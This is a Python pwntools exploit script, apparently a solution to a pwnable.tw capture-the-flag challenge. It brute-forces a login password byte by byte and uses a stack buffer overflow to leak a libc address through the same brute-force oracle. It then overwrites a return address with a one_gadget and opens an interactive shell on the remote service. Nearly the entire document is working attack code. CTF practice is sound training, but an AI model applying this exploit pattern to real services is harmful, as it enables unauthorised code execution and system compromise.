from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '75']

PROG = './chal'
exe = ELF(PROG)
libc = ELF('./libc_64.so.6')

### ------------------ EXPLOIT ------------------ ###

#r = process(PROG)
r = remote('chall.pwnable.tw', 10205)

def choice(c):
    r.sendlineafter(b'>> ', str(c).encode())

def try_pass(p):
    choice(1)
    res = r.recv(5)
    print(res)
    if b'>>' in res:
        # already logged in, reset
        r.sendline(b'1')
        r.clean()
    r.sendline(p)
    res = r.recvline()
    return b'Success' in res


# brute force password
password = b''
for _ in range(0x10):
    found = False
    for i in range(1,256):
        guess = password + bytes([i])

        if try_pass(guess):
            password += bytes([i])
            print(f'updated pass len {len(password)}')
            found = True
            break
    if not found:
        print('failed')
        exit(1)

log.info('Found password: ' + str(password))

# add padding to expose libc
pay = password + b'\x00'
pay += b'A' * (64 - len(pay))
pay += password
pay += b'B' * (8*1)

choice(1)
r.recv(5)
r.sendline(b'1')
r.send(pay)

choice(3)
r.sendafter(b'Copy :', b'b' * 0x3f)

# libc leak via brute force
guess = password
guess += b'\x31\x0a' + b'B' * 6

libc_leak = b''

for _ in range(6):
    found = False
    for i in range(1, 256):
        g = guess + libc_leak + bytes([i])

        if try_pass(g):
            libc_leak += bytes([i])
            print(f'updated libc len {len(libc_leak)}')
            found = True
            break
    if not found:
        print('failed libc')
        exit(1)

libc_leak += b'\x00' * 2
libc_leak = u64(libc_leak)
libc.address = libc_leak - 0x6ffb4

log.info('Leaked libc base: ' + hex(libc.address))

one_gadget = libc.address + 0x45216
# initialize buffer with padding
pay = password + b'\x00'
pay += b'A' * (64 - len(pay))
pay += password
pay += b'B' * (3*8)
pay += p64(one_gadget)

try_pass(pay)

choice(3)
r.sendafter(b'Copy :', b'b' * 0x3f)

# exit out
r.sendlineafter(b'>> ', b'2')

r.interactive()
